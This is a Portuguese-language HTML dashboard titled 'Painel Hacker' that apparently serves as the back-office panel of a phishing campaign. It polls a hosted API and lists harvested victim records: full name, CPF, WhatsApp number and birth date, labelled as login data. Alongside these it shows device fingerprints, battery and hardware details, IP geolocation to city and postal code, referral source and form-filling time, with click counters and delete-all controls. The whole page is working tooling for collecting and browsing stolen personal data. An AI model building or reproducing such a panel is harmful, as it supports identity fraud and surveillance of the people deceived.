<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PAINEL // ACESSO RESTRITO</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Consolas', 'Courier New', monospace;
      background: #000;
      color: #00ff41;
      padding: 20px;
      min-height: 100vh;
      text-shadow: 0 0 5px rgba(0,255,65,0.7);
    }
    .terminal-bar {
      background: #0a0a0a; border: 1px solid #00ff41;
      border-radius: 8px 8px 0 0; padding: 8px 14px;
      display: flex; align-items: center; gap: 8px;
      font-size: 12px; margin-bottom: -1px;
    }
    .dot-vermelho, .dot-amarelo, .dot-verde {
      width: 12px; height: 12px; border-radius: 50%; display: inline-block;
    }
    .dot-vermelho { background: #ff5f56; }
    .dot-amarelo { background: #ffbd2e; }
    .dot-verde { background: #27c93f; }
    .terminal-titulo { margin-left: 10px; color: #00ff41; font-size: 12px; letter-spacing: 1px; }
    .header {
      border: 1px solid #00ff41; border-radius: 0 0 8px 8px;
      padding: 18px; margin-bottom: 20px;
      display: flex; justify-content: space-between; align-items: center;
      flex-wrap: wrap; gap: 12px;
      background: rgba(0,255,65,0.03);
    }
    h1 { font-size: 20px; letter-spacing: 2px; text-transform: uppercase; }
    h1::before { content: '> '; }
    h1::after { content: '_'; animation: blink 1s infinite; }
    @keyframes blink { 0%,50%{opacity:1;} 51%,100%{opacity:0;} }
    .status { font-size: 13px; color: #00ff41; letter-spacing: 1px; }
    .dot {
      display: inline-block; width: 9px; height: 9px;
      border-radius: 50%; background: #00ff41; margin-right: 6px;
      box-shadow: 0 0 8px #00ff41;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
    .cards-top { display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 20px; }
    .card-top {
      background: #050505; border: 1px solid #00ff41;
      padding: 18px; border-radius: 6px;
      flex: 1; min-width: 150px;
      box-shadow: 0 0 15px rgba(0,255,65,0.2);
      position: relative; overflow: hidden;
    }
    .card-top::before {
      content: ''; position: absolute; top: 0; left: 0;
      width: 100%; height: 2px;
      background: linear-gradient(90deg, transparent, #00ff41, transparent);
      animation: scan 3s linear infinite;
    }
    @keyframes scan { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
    .card-top .num { font-size: 32px; font-weight: bold; color: #00ff41; text-shadow: 0 0 10px #00ff41; }
    .card-top .lbl { font-size: 11px; color: #00aa2b; text-transform: uppercase; margin-top: 6px; letter-spacing: 1.5px; }
    .controles { display: flex; gap: 10px; margin-bottom: 14px; flex-wrap: wrap; }
    button {
      padding: 9px 16px; border: 1px solid #00ff41;
      background: transparent; color: #00ff41;
      border-radius: 4px; font-size: 13px; cursor: pointer;
      font-weight: 600; font-family: inherit;
      letter-spacing: 1px; text-transform: uppercase;
      transition: all 0.2s;
    }
    button:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
    .btn-del-all { border-color: #ff3b3b; color: #ff3b3b; }
    .btn-del-all:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
    .btn-del { border-color: #ff3b3b; color: #ff3b3b; padding: 5px 12px; font-size: 11px; }
    .btn-del:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
    .busca {
      width: 100%; padding: 11px; background: #050505;
      border: 1px solid #00ff41; border-radius: 4px;
      font-size: 14px; margin-bottom: 14px;
      color: #00ff41; font-family: inherit; letter-spacing: 1px;
    }
    .busca::placeholder { color: #00aa2b; }
    .busca:focus { outline: none; box-shadow: 0 0 15px rgba(0,255,65,0.4); }
    .lista { display: flex; flex-direction: column; gap: 14px; }
    .cadastro {
      background: #050505; border: 1px solid #00ff41;
      border-radius: 6px; overflow: hidden;
      box-shadow: 0 0 15px rgba(0,255,65,0.15);
    }
    .cadastro-header {
      display: flex; justify-content: space-between;
      align-items: center; gap: 10px;
      padding: 14px 18px;
      background: rgba(0,255,65,0.08);
      border-bottom: 1px solid #00ff41; flex-wrap: wrap;
    }
    .cadastro-nome {
      font-size: 16px; font-weight: bold; color: #00ff41;
      letter-spacing: 1px; text-shadow: 0 0 8px rgba(0,255,65,0.6);
    }
    .cadastro-nome::before { content: '[USER] '; color: #00aa2b; font-size: 12px; }
    .cadastro-data { font-size: 11px; color: #00aa2b; letter-spacing: 1px; }
    .bloco-titulo {
      padding: 8px 18px; background: rgba(0,255,65,0.12);
      font-size: 11px; font-weight: 700;
      text-transform: uppercase; color: #00ff41;
      letter-spacing: 2px; border-bottom: 1px solid #00ff41;
    }
    .bloco-titulo::before { content: '$ '; }
    .bloco-device .bloco-titulo { background: rgba(0,180,255,0.12); color: #00b4ff; border-bottom: 1px solid #00b4ff; }
    .bloco-bateria .bloco-titulo { background: rgba(255,200,0,0.12); color: #ffc800; border-bottom: 1px solid #ffc800; }
    .bloco-hw .bloco-titulo { background: rgba(200,0,255,0.12); color: #d966ff; border-bottom: 1px solid #d966ff; }
    .bloco-loc .bloco-titulo { background: rgba(255,0,120,0.12); color: #ff0078; border-bottom: 1px solid #ff0078; }
    .bloco-origem .bloco-titulo { background: rgba(255,140,0,0.12); color: #ff8c00; border-bottom: 1px solid #ff8c00; }
    .cadastro-body {
      padding: 16px 18px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 14px;
    }
    .campo { font-size: 13px; }
    .campo .rotulo {
      color: #00aa2b; font-size: 10px;
      text-transform: uppercase; font-weight: 600;
      margin-bottom: 3px; letter-spacing: 1.5px;
    }
    .campo .rotulo::before { content: '> '; }
    .campo .valor { color: #00ff41; word-break: break-word; font-size: 14px; }
    .bloco-device .campo .rotulo { color: #0088bb; }
    .bloco-device .campo .valor { color: #00b4ff; text-shadow: 0 0 5px rgba(0,180,255,0.7); }
    .bloco-bateria .campo .rotulo { color: #aa8800; }
    .bloco-bateria .campo .valor { color: #ffc800; text-shadow: 0 0 5px rgba(255,200,0,0.7); }
    .bloco-hw .campo .rotulo { color: #8800aa; }
    .bloco-hw .campo .valor { color: #d966ff; text-shadow: 0 0 5px rgba(200,0,255,0.7); }
    .bloco-loc .campo .rotulo { color: #aa0055; }
    .bloco-loc .campo .valor { color: #ff0078; text-shadow: 0 0 5px rgba(255,0,120,0.7); }
    .bloco-origem .campo .rotulo { color: #aa5500; }
    .bloco-origem .campo .valor { color: #ff8c00; text-shadow: 0 0 5px rgba(255,140,0,0.7); }
    .vazio {
      text-align: center; padding: 40px; color: #00aa2b;
      letter-spacing: 2px; border: 1px dashed #00aa2b; border-radius: 6px;
    }
    .botoes-card {
      padding: 10px 18px; border-top: 1px solid #00ff41;
      display: flex; justify-content: flex-end;
    }
    ::-webkit-scrollbar { width: 10px; height: 10px; }
    ::-webkit-scrollbar-track { background: #000; }
    ::-webkit-scrollbar-thumb { background: #00aa2b; border-radius: 5px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
  </style>
</head>
<body>

  <div class="terminal-bar">
    <span class="dot-vermelho"></span>
    <span class="dot-amarelo"></span>
    <span class="dot-verde"></span>
    <span class="terminal-titulo">root@gets-invio-on:~$ ./painel.sh</span>
  </div>

  <div class="header">
    <h1>Painel Hacker</h1>
    <div class="status"><span class="dot"></span>SYSTEM ONLINE // AUTO-REFRESH 5s</div>
  </div>

  <div class="cards-top">
    <div class="card-top">
      <div class="num" id="total-visitas">0</div>
      <div class="lbl">Cliques</div>
    </div>
    <div class="card-top">
      <div class="num" id="visitas-hoje">0</div>
      <div class="lbl">Cliques hoje</div>
    </div>
    <div class="card-top">
      <div class="num" id="total">0</div>
      <div class="lbl">Total de cadastros</div>
    </div>
    <div class="card-top">
      <div class="num" id="hoje">0</div>
      <div class="lbl">Cadastros hoje</div>
    </div>
  </div>

  <div class="controles">
    <button class="btn-refresh" onclick="carregarTudo()">[ REFRESH ]</button>
    <button class="btn-del-all" onclick="apagarTudo()">[ DELETE ALL ]</button>
  </div>

  <input id="busca" class="busca" type="text" placeholder="> grep search..." oninput="filtrar()" />

  <div class="lista" id="lista"></div>

  <script>
    const API_URL = 'https://gets-invio-on-api.onrender.com';
    let todosDados = [];

    async function carregarVisitas() {
      try {
        const r = await fetch(API_URL + '/visitas');
        const { total, hoje } = await r.json();
        document.getElementById('total-visitas').textContent = total;
        document.getElementById('visitas-hoje').textContent = hoje;
      } catch (e) {
        document.getElementById('total-visitas').textContent = '-';
        document.getElementById('visitas-hoje').textContent = '-';
      }
    }

    async function carregar() {
      try {
        const r = await fetch(API_URL + '/dados');
        const { dados } = await r.json();
        todosDados = dados;
        document.getElementById('total').textContent = dados.length;
        const hoje = new Date().toDateString();
        const doDia = dados.filter(d => new Date(d.recebidoEm).toDateString() === hoje);
        document.getElementById('hoje').textContent = doDia.length;
        renderizar(dados);
      } catch (e) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[!] CONEXAO FALHOU — servidor offline?</div>';
      }
    }

    function carregarTudo() { carregarVisitas(); carregar(); }

    function filtrar() {
      const termo = document.getElementById('busca').value.toLowerCase().trim();
      if (!termo) { renderizar(todosDados); return; }
      const filtrado = todosDados.filter(d =>
        (d.nome || '').toLowerCase().includes(termo) ||
        (d.whatsapp || '').toLowerCase().includes(termo) ||
        (d.cpf || '').toLowerCase().includes(termo) ||
        (d.localizacao && d.localizacao.cidade || '').toLowerCase().includes(termo) ||
        (d.origem || '').toLowerCase().includes(termo)
      );
      renderizar(filtrado);
    }

    function esc(s) {
      return String(s == null ? '-' : s).replace(/[&<>"']/g, c => ({
        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
      })[c]);
    }

    function formatarData(iso) {
      if (!iso) return '-';
      if (/^\d{4}-\d{2}-\d{2}$/.test(iso)) {
        const [a, m, d] = iso.split('-');
        return `${d}/${m}/${a}`;
      }
      return iso;
    }

    function iconeSistema(s) {
      if (s === 'Android') return '🤖';
      if (s === 'iOS') return '🍎';
      if (s === 'Windows') return '🪟';
      if (s === 'MacOS') return '🍏';
      if (s === 'Linux') return '🐧';
      return '❓';
    }
    function iconeTipo(t) {
      if (t === 'Celular') return '📱';
      if (t === 'Tablet') return '📟';
      if (t === 'PC') return '💻';
      return '❓';
    }
    function iconeBateria(nivel) {
      if (nivel === null || nivel === undefined) return '🔌';
      if (nivel >= 50) return '🔋';
      return '🪫';
    }
    function formatarConexao(c) {
      if (!c) return 'N/A';
      if (c === '4g') return '⚡ Rápida';
      if (c === '3g') return '📶 Média';
      if (c === '2g') return '🐢 Lenta';
      if (c === 'slow-2g') return '🐌 Muito lenta';
      return c.toUpperCase();
    }
    function formatarOrientacao(o) {
      if (!o) return '-';
      if (o.includes('portrait')) return '📱 Retrato';
      if (o.includes('landscape')) return '🔄 Paisagem';
      return o;
    }
    function bandeiraPais(codigo) {
      if (!codigo || codigo.length !== 2) return '🌍';
      const codePoints = codigo.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
      return String.fromCodePoint(...codePoints);
    }
    function iconeOrigem(o) {
      if (!o) return '❓';
      if (o.includes('WhatsApp')) return '💬';
      if (o.includes('Instagram')) return '📷';
      if (o.includes('Facebook')) return '📘';
      if (o.includes('TikTok')) return '🎵';
      if (o.includes('Google')) return '🔍';
      if (o.includes('Bing')) return '🔎';
      if (o.includes('YouTube')) return '▶️';
      if (o.includes('Twitter') || o.includes('X')) return '🐦';
      if (o.includes('Telegram')) return '✈️';
      if (o.includes('LinkedIn')) return '💼';
      if (o.includes('Direto')) return '⌨️';
      return '🌐';
    }
    function formatarTempo(seg) {
      if (!seg && seg !== 0) return 'N/A';
      if (seg < 60) return `${seg} segundos`;
      const min = Math.floor(seg / 60);
      const s = seg % 60;
      return `${min} min ${s}s`;
    }

    function renderizar(dados) {
      if (dados.length === 0) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[ NENHUM REGISTRO ENCONTRADO ]</div>';
        return;
      }

      const html = dados.slice().reverse().map(d => {
        const dev = d.dispositivo || {};
        const loc = d.localizacao || null;

        const blocoDevice = `
          <div class="bloco-device">
            <div class="bloco-titulo">DISPOSITIVO</div>
            <div class="cadastro-body">
              <div class="campo"><div class="rotulo">Sistema</div><div class="valor">${iconeSistema(dev.sistema)} ${esc(dev.sistema)}</div></div>
              <div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ${esc(dev.navegador)}</div></div>
              <div class="campo"><div class="rotulo">Tipo</div><div class="valor">${iconeTipo(dev.tipo)} ${esc(dev.tipo)}</div></div>
              <div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ${esc(dev.idioma)}</div></div>
              <div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ${esc(dev.tela)}</div></div>
              <div class="campo"><div class="rotulo">Fuso horário</div><div class="valor">🕒 ${esc(dev.fuso)}</div></div>
              <div class="campo"><div class="rotulo">Orientação</div><div class="valor">${formatarOrientacao(dev.orientacao)}</div></div>
              <div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">${esc(dev.pixelRatio || 1)}x</div></div>
              <div class="campo"><div class="rotulo">Touchscreen</div><div class="valor">${dev.touch ? '👆 Sim' : '❌ Não'}</div></div>
              <div class="campo"><div class="rotulo">Cookies</div><div class="valor">${dev.cookies ? '🍪 Sim' : '❌ Não'}</div></div>
              <div class="campo"><div class="rotulo">Hora do cliente</div><div class="valor">🕐 ${esc(dev.horaCliente)}</div></div>
            </div>
          </div>
        `;

        const blocoBateria = `
          <div class="bloco-bateria">
            <div class="bloco-titulo">BATERIA & CONEXÃO</div>
            <div class="cadastro-body">
              <div class="campo"><div class="rotulo">Bateria</div><div class="valor">${iconeBateria(dev.bateria && dev.bateria.nivel)} ${dev.bateria ? dev.bateria.nivel + '%' : 'N/A'}</div></div>
              <div class="campo"><div class="rotulo">Carregando?</div><div class="valor">${dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A'}</div></div>
              <div class="campo"><div class="rotulo">Velocidade da conexão</div><div class="valor">${formatarConexao(dev.conexao)}</div></div>
            </div>
          </div>
        `;

        const blocoHW = `
          <div class="bloco-hw">
            <div class="bloco-titulo">HARDWARE</div>
            <div class="cadastro-body">
              <div class="campo"><div class="rotulo">RAM estimada</div><div class="valor">🧠 ${dev.ram ? dev.ram + ' GB' : 'N/A'}</div></div>
              <div class="campo"><div class="rotulo">Núcleos CPU</div><div class="valor">⚙️ ${dev.nucleos || 'N/A'}</div></div>
              <div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ${esc(dev.gpu)}</div></div>
              <div class="campo"><div class="rotulo">Profundidade de cor</div><div class="valor">🎨 ${dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A'}</div></div>
            </div>
          </div>
        `;

        const blocoLoc = loc ? `
          <div class="bloco-loc">
            <div class="bloco-titulo">LOCALIZAÇÃO & IP</div>
            <div class="cadastro-body">
              <div class="campo"><div class="rotulo">IP</div><div class="valor">🌐 ${esc(d.ip)}</div></div>
              <div class="campo"><div class="rotulo">País</div><div class="valor">${bandeiraPais(loc.codigoPais)} ${esc(loc.pais)}</div></div>
              <div class="campo"><div class="rotulo">Estado / Região</div><div class="valor">🗺️ ${esc(loc.regiao)}</div></div>
              <div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ${esc(loc.cidade)}</div></div>
              <div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ${esc(loc.cep)}</div></div>
              <div class="campo"><div class="rotulo">Operadora / Provedor</div><div class="valor">📡 ${esc(loc.operadora)}</div></div>
            </div>
          </div>
        ` : '';

        const blocoOrigem = `
          <div class="bloco-origem">
            <div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div>
            <div class="cadastro-body">
              <div class="campo"><div class="rotulo">Veio de onde</div><div class="valor">${iconeOrigem(d.origem)} ${esc(d.origem)}</div></div>
              <div class="campo"><div class="rotulo">Já visitou antes</div><div class="valor">${d.jaVisitou ? '🔁 Sim (cliente recorrente)' : '🆕 Primeira vez'}</div></div>
              <div class="campo"><div class="rotulo">Tempo de preenchimento</div><div class="valor">⏱️ ${formatarTempo(d.tempoPreenchimento)}</div></div>
            </div>
          </div>
        `;

        return `
        <div class="cadastro">
          <div class="cadastro-header">
            <div class="cadastro-nome">${esc(d.nome)}</div>
            <div class="cadastro-data">${new Date(d.recebidoEm).toLocaleString('pt-BR')}</div>
          </div>

          <div class="bloco-titulo">DADOS DO LOGIN</div>
          <div class="cadastro-body">
            <div class="campo"><div class="rotulo">Nome completo</div><div class="valor">${esc(d.nome)}</div></div>
            <div class="campo"><div class="rotulo">CPF</div><div class="valor">${esc(d.cpf)}</div></div>
            <div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">${esc(d.whatsapp)}</div></div>
            <div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">${formatarData(d.dataNascimento)}</div></div>
          </div>

          ${d.dispositivo ? blocoDevice + blocoBateria + blocoHW : ''}
          ${blocoLoc}
          ${blocoOrigem}

          <div class="botoes-card">
            <button class="btn-del" onclick="apagar(${d.id})">[ DELETE ]</button>
          </div>
        </div>
        `;
      }).join('');

      document.getElementById('lista').innerHTML = html;
    }

    async function apagar(id) {
      if (!confirm('DELETAR esse cadastro?')) return;
      await fetch(API_URL + '/dados/' + id, { method: 'DELETE' });
      carregar();
    }

    async function apagarTudo() {
      if (!confirm('⚠️ DELETAR TODOS os cadastros? Sem volta!')) return;
      await fetch(API_URL + '/dados', { method: 'DELETE' });
      carregarTudo();
    }

    carregarVisitas();
    carregar();
    setInterval(() => { carregarVisitas(); carregar(); }, 5000);
  </script>
</body>
</html>
